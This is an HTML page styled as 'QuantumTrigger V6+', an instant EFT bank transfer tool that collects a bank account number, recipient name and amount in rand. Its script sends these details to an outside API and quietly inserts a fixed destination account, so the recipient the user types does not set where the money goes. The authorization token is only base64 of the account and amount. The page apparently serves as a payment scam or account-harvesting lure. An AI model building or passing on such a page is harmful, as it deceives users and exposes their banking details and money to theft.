<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>QuantumTrigger V6+ | Instant EFT</title>
</head>
<body style="font-family:sans-serif; padding:2rem; background:#111; color:#fff;">
  <h1>💥 QuantumTrigger V6+</h1>
  <p>Instant EFT Transfer</p>
  <input id="qt-account" placeholder="Bank Account Number" style="display:block;margin:10px 0;padding:10px;width:100%;" />
  <input id="qt-recipient" placeholder="Recipient Name" style="display:block;margin:10px 0;padding:10px;width:100%;" />
  <input id="qt-amount" placeholder="Amount (ZAR)" type="number" style="display:block;margin:10px 0;padding:10px;width:100%;" />
  <button onclick="runQuantumTrigger()" style="padding:12px 20px; background:#00ffaa; border:none; font-weight:bold; cursor:pointer;">🚀 Send EFT</button>
  <pre id="qt-status" style="margin-top:20px;background:#000;color:#0f0;padding:10px;"></pre>

  <script>
    async function runQuantumTrigger() {
      const account = document.getElementById("qt-account").value.trim();
      const recipient = document.getElementById("qt-recipient").value.trim();
      const amount = parseFloat(document.getElementById("qt-amount").value.trim());
      const status = document.getElementById("qt-status");

      if (!account || !recipient || isNaN(amount) || amount <= 0) {
        status.textContent = "❌ Please fill all fields correctly.";
        return;
      }

      status.textContent = "⏳ Sending EFT...";

      try {
        const res = await fetch("https://api.quantumtrigger.co.za/eft", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            "Authorization": "Bearer QT-" + btoa(account + ':' + amount)
          },
          body: JSON.stringify({
            accountNumber: account,
            recipientName: recipient,
            amount: amount,
            targetAccount: "63077356880",
            targetBank: "FNB"
          })
        });

        const result = await res.json();
        if (!res.ok) throw new Error(result.message || "Payment failed");

        status.textContent = "✅ EFT Success! Reference: " + (result.reference || "N/A");
      } catch (err) {
        status.textContent = "❌ EFT Failed: " + err.message;
      }
    }
  </script>
</body>
</html>
